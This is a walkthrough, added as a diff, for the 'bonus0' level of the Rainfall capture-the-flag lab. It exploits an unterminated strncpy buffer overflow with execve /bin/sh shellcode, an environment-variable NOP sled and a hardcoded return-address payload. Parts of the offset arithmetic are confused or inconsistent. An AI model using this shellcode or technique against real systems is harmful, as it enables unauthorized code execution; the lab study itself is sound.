@@ -1,0 +1,82 @@
+# Rainfall — Bonus0 Walkthrough
+
+## Step 1: Initial Analysis
+- Copy the program locally and open the binary in Ghidra.  
+- `main` allocates a 54‑byte buffer (`local_3a`) and calls `pp`.
+
+## Step 2: Function Behavior
+- `pp` has two 20‑byte buffers: `local_34` and `local_20`.  
+- It calls `p` twice to fill them.
+
+### Function `p`
+- Reads 4096 bytes into a temporary buffer.
+- Replaces the first newline (`\n`, 0x0A) with `\0`.
+- Copies exactly 20 bytes into the target with `strncpy`.
+
+**Note:**  
+`strncpy(param_1, local_100c, 0x14)` copies exactly 20 bytes. If the input is 20 bytes or longer, no null terminator is added.  
+`pp` then does `strcpy(param_1, local_34)`, which keeps reading until it finds a `\0`.
+
+**Stack layout:**  
+`local_34` is immediately followed by `local_20`.
+
+## Step 3: Impact
+- First `p` call (`local_34`): provide 20 bytes → no null terminator.
+- Second `p` call (`local_20`): provide payload.
+
+When `strcpy(param_1, local_34)` runs, it copies `local_34` and continues into `local_20`.  
+Then `strcat(param_1, local_20)` appends `local_20` again, expanding the combined string into `main`’s `local_3a` buffer.
+
+## Step 4: Offset and Crash
+- `local_3a` is 54 bytes.
+- Return address is typically ~72 bytes from the start of `local_3a`.
+- Using a pattern in GDB:
+
+```bash
+(gdb) run
+ -
+AAAABBBBCCCCDDDDEEEE
+ -
+AAAABBBBCCCCDDDDEEEE
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44434343 in ?? ()
+```
+
+**Finding the 76‑byte offset**  
+`EIP = 0x44434343` corresponds to the pattern `DCCC`. In the input pattern, `DCCC` starts 76 bytes from the beginning, so the return address offset is 76.
+
+**Why the “9‑byte” piece in the final payload**  
+Why “13”?  
+The first `strcpy` copies 40 bytes (20 from `local_34` + 20 from `local_20`) into `local_3a`. That consumes 40 of the 54 bytes, leaving 14 bytes of `local_3a` before the saved return address region. The remaining gap to the return address is `76 − 40 = 36` bytes, but 14 are already in the buffer, so `36 − 14 = 22`.  
+Inside `local_20`, 13 bytes are already used by the overlap from the first copy, so you need `22 − 13 = 9` bytes before the return address, then `4` bytes for the address, and `7` bytes of padding to reach 20 total.
+
+## Step 5: Shellcode and Address
+Example shellcode:
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+```
+
+Export a NOP sled + shellcode:
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*400 + "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+```
+
+Find shellcode address:
+```bash
+gdb ./bonus0
+run
+x/500s $esp
+```
+
+Choose a midpoint address to land in the NOP sled (e.g., `0xbffff81a`).
+We are using 4095 because the read reads up to 4096 bytes, and we need one byte for the newline.
+Final payload:
+```bash
+python -c 'print "B"*4095+"\n"+"A"*9+"\x1a\xf8\xff\xbf"+"B"*7' > /tmp/payload
+```
+
+9 + 4 + 7 = 20 bytes for `local_20`.
+
+**Why `"B"*7`?**  
+To ensure the total length of `local_20` is exactly 20 bytes, since we already have 9 bytes of "A" and 4 bytes for the return address.
